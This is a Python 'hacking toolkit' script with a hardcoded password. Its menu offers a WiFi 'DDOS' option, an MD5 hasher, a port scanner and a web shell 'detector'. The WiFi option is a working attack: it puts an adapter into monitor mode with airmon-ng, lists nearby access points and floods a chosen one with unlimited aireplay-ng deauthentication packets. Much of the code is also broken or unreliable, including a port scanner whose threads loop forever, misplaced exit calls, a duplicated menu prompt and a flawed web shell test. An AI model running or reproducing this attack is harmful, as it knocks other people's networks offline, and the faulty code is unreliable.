import subprocess
import requests
import re
import csv
import os
import time
import shutil
import threading
import sys
from datetime import datetime
import hashlib
from time import sleep
import socket
import time
import threading
from queue import Queue
from matplotlib.pyplot import close
if not 'SUDO_UID' in os.environ.keys():
    print("Try running this program with sudo.")
    exit()
user = "admin"
password = 'KEP'

os.system('clear')
os.system('sudo apt-get install figlet -y')
os.system('sudo apt-get install lolcat -y')
os.system('clear')
os.system("figlet -w 160 -f mono9 Enter UserName And Password|lolcat")
usser = input('Enter Your User :: ')
pas = input('Enter Your Password :: ')

if usser == user and pas == password:
    os.system('clear')
    print ((('''


    ██████╗░██████╗░░░░░█████╗░██╗░░░░░██╗███████╗███╗░░██╗████████╗
    ██╔══██╗██╔══██╗░░░██╔══██╗██║░░░░░██║██╔════╝████╗░██║╚══██╔══╝
    ██║░░██║██████╔╝░░░██║░░╚═╝██║░░░░░██║█████╗░░██╔██╗██║░░░██║░░░
    ██║░░██║██╔══██╗░░░██║░░██╗██║░░░░░██║██╔══╝░░██║╚████║░░░██║░░░
    ██████╔╝██║░░██║██╗╚█████╔╝███████╗██║███████╗██║░╚███║░░░██║░░░
    ╚═════╝░╚═╝░░╚═╝╚═╝░╚════╝░╚══════╝╚═╝╚══════╝╚═╝░░╚══╝░░░╚═╝░░░


    (1)DDOS Wifi                             (2)Hash MD5



    (3)port Scanner                          (4)vulnerability
        


    ''')))

    n1=1 
    n2=2
    n3=3
    n4=4
    number_input = input  ("Enter Your Number : ")
    int(number_input)
    if int(number_input) == n1 : 
        time.sleep(2)
        os.system ('clear')
        time.sleep(2)
        active_wireless_networks = []

        def check_for_essid(essid, lst):
            check_status = True

            if len(lst) == 0:
                return check_status

            for item in lst:
                if essid in item["ESSID"]:
                    check_status = False

            return check_status

        print((("""
        ██████╗░██████╗░░░░░█████╗░██╗░░░░░██╗███████╗███╗░░██╗████████╗
        ██╔══██╗██╔══██╗░░░██╔══██╗██║░░░░░██║██╔════╝████╗░██║╚══██╔══╝
        ██║░░██║██████╔╝░░░██║░░╚═╝██║░░░░░██║█████╗░░██╔██╗██║░░░██║░░░
        ██║░░██║██╔══██╗░░░██║░░██╗██║░░░░░██║██╔══╝░░██║╚████║░░░██║░░░
        ██████╔╝██║░░██║██╗╚█████╔╝███████╗██║███████╗██║░╚███║░░░██║░░░
        ╚═════╝░╚═╝░░╚═╝╚═╝░╚════╝░╚══════╝╚═╝╚══════╝╚═╝░░╚══╝░░░╚═╝░░░ """)))
        print("\n****************************************************************")
        print("\n* Copyright of Dr.Client, 2022                                 *")
        print("\n* https://www.youtube.com/channel/UCsnpxsZNceG0meuM_3k3k8w     *")
        print("\n****************************************************************")


        if not 'SUDO_UID' in os.environ.keys():
            print("Try running this program with sudo.")
            exit()

        for file_name in os.listdir():
            if ".csv" in file_name:
                print("There shouldn't be any .csv files in your directory. We found .csv files in your directory and will move them to the backup directory.")
                directory = os.getcwd()
                try:
                    os.mkdir(directory + "/backup/")
                except:
                    print("Backup folder exists.")
                timestamp = datetime.now()
                shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)

        wlan_pattern = re.compile("^wlan[0-9]+")


        check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

        if len(check_wifi_result) == 0:
            print("Please connect a WiFi adapter and try again.")
            exit()


        print("The following WiFi interfaces are available:")
        for index, item in enumerate(check_wifi_result):
            print(f"{index} - {item}")


        while True:
            wifi_interface_choice = input("Please select the interface you want to use for the attack: ")
            try:
                if check_wifi_result[int(wifi_interface_choice)]:
                    break
            except:
                print("Please enter a number that corresponds with the choices available.")

        hacknic = check_wifi_result[int(wifi_interface_choice)]

        print("WiFi adapter connected!\nNow let's kill conflicting processes:")


        kill_confilict_processes =  subprocess.run(["sudo", "airmon-ng", "check", "kill"])

        print("Putting Wifi adapter into monitored mode:")
        put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", hacknic])

        discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        try:
            while True:
                subprocess.call("clear", shell=True)
                for file_name in os.listdir():
                    
                        fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                        if ".csv" in file_name:
                            with open(file_name) as csv_h:
                                csv_h.seek(0)
                                csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                                for row in csv_reader:
                                    if row["BSSID"] == "BSSID":
                                        pass
                                    elif row["BSSID"] == "Station MAC":
                                        break
                                    elif check_for_essid(row["ESSID"], active_wireless_networks):
                                        active_wireless_networks.append(row)

                print("Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n")
                print("No |\tBSSID              |\tChannel|\tESSID                         |")
                print("___|\t___________________|\t_______|\t______________________________|")
                for index, item in enumerate(active_wireless_networks):
                
                    print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
                time.sleep(1)

        except KeyboardInterrupt:
            print("\nReady to make choice.")

        while True:
        
            choice = input("Please select a choice from above: ")
            try:
                if active_wireless_networks[int(choice)]:
                    break
            except:
                print("Please try again.")


        hackbssid = active_wireless_networks[int(choice)]["BSSID"]
        hackchannel = active_wireless_networks[int(choice)]["channel"].strip()


        subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])


        subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"])







    if int(number_input) == n2 : 
        sleep(2)
        os.system ('clear')
        sleep(2)
        print((('''' \033[1;34;40m



    ███╗░░░███╗██████╗░███████╗
    ████╗░████║██╔══██╗██╔════╝
    ██╔████╔██║██║░░██║██████╗░
    ██║╚██╔╝██║██║░░██║╚════██╗
    ██║░╚═╝░██║██████╔╝██████╔╝
    ╚═╝░░░░░╚═╝╚═════╝░╚═════╝░



        ''')))
        mystring = input('Enter string to hash (MD5): ')
        print("")
        print("")
        hash_obj = hashlib.md5(mystring.encode())
        print(hash_obj.hexdigest())
        print("")
        print("Dr.Client wish you good day :)")
        exit()

    if int(number_input) == n3 :
        sleep(2)
        os.system ('clear')
        sleep(2)
        print((('''  \033[1;34;40m




        

    ██████╗░░█████╗░██████╗░████████╗  ░██████╗░█████╗░░█████╗░███╗░░██╗███╗░░██╗███████╗██████╗░
    ██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝  ██╔════╝██╔══██╗██╔══██╗████╗░██║████╗░██║██╔════╝██╔══██╗
    ██████╔╝██║░░██║██████╔╝░░░██║░░░  ╚█████╗░██║░░╚═╝███████║██╔██╗██║██╔██╗██║█████╗░░██████╔╝
    ██╔═══╝░██║░░██║██╔══██╗░░░██║░░░  ░╚═══██╗██║░░██╗██╔══██║██║╚████║██║╚████║██╔══╝░░██╔══██╗
    ██║░░░░░╚█████╔╝██║░░██║░░░██║░░░  ██████╔╝╚█████╔╝██║░░██║██║░╚███║██║░╚███║███████╗██║░░██║
    ╚═╝░░░░░░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░  ╚═════╝░░╚════╝░╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝







        ''')))


 
        def port_scanner(ip, port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((ip, port))
                print(f"Port {port} is open")
                sock.close()
            except:
               pass

        def threader(ip, port):
            while True:
                port_scanner(ip, port)
                time.sleep(0.1)

        ip = "192.168.1.1" # replace with the IP address you want to scan
        ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 137, 138, 139, 443, 445, 1433, 3306, 3389, 8080, 8443] # replace with the ports you want to scan

        for port in ports:
            print(f"Starting thread for port {port}")
            t = threading.Thread(target=threader, args=(ip, port))
            t.start()
            exit()



    if int(number_input) == n4 : 
        sleep(2)
        os.system ('clear')
        sleep(2)
        print((("""
        
        
        
    ██╗░░░██╗██╗░░░██╗██╗░░░░░███╗░░██╗███████╗██████╗░░█████╗░██████╗░██╗██╗░░░░░██╗████████╗██╗░░░██╗
    ██║░░░██║██║░░░██║██║░░░░░████╗░██║██╔════╝██╔══██╗██╔══██╗██╔══██╗██║██║░░░░░██║╚══██╔══╝╚██╗░██╔╝
    ╚██╗░██╔╝██║░░░██║██║░░░░░██╔██╗██║█████╗░░██████╔╝███████║██████╦╝██║██║░░░░░██║░░░██║░░░░╚████╔╝░
    ░╚████╔╝░██║░░░██║██║░░░░░██║╚████║██╔══╝░░██╔══██╗██╔══██║██╔══██╗██║██║░░░░░██║░░░██║░░░░░╚██╔╝░░
    ░░╚██╔╝░░╚██████╔╝███████╗██║░╚███║███████╗██║░░██║██║░░██║██████╦╝██║███████╗██║░░░██║░░░░░░██║░░░
    ░░░╚═╝░░░░╚═════╝░╚══════╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝╚══════╝╚═╝░░░╚═╝░░░░░░╚═╝░░░



    1:WEB SHELL DETECTOR         
    
        """)))
    number_input = input  ("Enter Your Number : ")
    int(number_input)
    if int(number_input) == n1 : 
        sleep(2)
        os.system ('clear')
        sleep(2)
        print((("""
                                                                                                                 
*@@@@*     @     *@@@**@@@***@@@ *@@@***@@m      m@***@m@*@@@@*  *@@@@***@@@***@@@ *@@@@*    *@@@@*    
  *@@     m@@     m@    @@    *@   @@    @@     m@@    *@  @@      @@     @@    *@   @@        @@      
   @@m   m@@@m   m@     @@   @     @@    @@     *@@@m      @@      @@     @@   @     @@        @@      
    @@m  @* @@m  @*     @@@@@@     @@***@mm       *@@@@@m  @@@@@@@@@@     @@@@@@     @@        @@      
    !@@ @*  *@@ @*      @@   @  m  @!    *@           *@@  !@      @!     @@   @  m  @!     m  @!     m
     !@@m    !@@m       @!     m@  !!    m@     @@     @@  !@      @!     @!     m@  @!    :@  @!    :@
     !!@!*   !!@!*      !!   !  !  !:    *!     !     *@!  :!      !!     !!   !  !  !!     !  !!     !
     !!!!    !!!!       !!     !!  !:    !!     !!     !!  :!      :!     !!     !!  !:    !!  !:    !!
      :       :       : :::!: : :: !: : : :     :!: : :! ::: :   : :!:: : :::!: : :: :: !: : : :: !: : 
                                                                                                       
                                                                                                       



        """)))
        


def test_webshell(url):
    # Test for PHP webshell
    php_test_url = url + "/test.php"
    php_test_payload = "<?php echo 'Hello, World!'; ?>"
    php_test_headers = {"Content-Type": "application/x-www-form-urlencoded"}
    response = requests.post(php_test_url, data=php_test_payload, headers=php_test_headers)
    if response.status_code == 200 and "Hello, World!" in response.text:
        return "PHP webshell detected"

    # Test for ASP webshell
    asp_test_url = url + "/test.asp"
    asp_test_payload = "<% Response.Write(\"Hello, World!\") %>"
    asp_test_headers = {"Content-Type": "application/x-www-form-urlencoded"}
    response = requests.post(asp_test_url, data=asp_test_payload, headers=asp_test_headers)
    if response.status_code == 200 and "Hello, World!" in response.text:
        return "ASP webshell detected"

    # Test for JSP webshell
    jsp_test_url = url + "/test.jsp"
    jsp_test_payload = "<% out.println(\"Hello, World!\"); %>"
    jsp_test_headers = {"Content-Type": "application/x-www-form-urlencoded"}
    response = requests.post(jsp_test_url, data=jsp_test_payload, headers=jsp_test_headers)
    if response.status_code == 200 and "Hello, World!" in response.text:
        return "JSP webshell detected"

    return "No webshell detected"

if __name__ == "__main__":
    url = input("Please enter the website URL: ")
    print(test_webshell(url))




else:
    print("Try Again !")

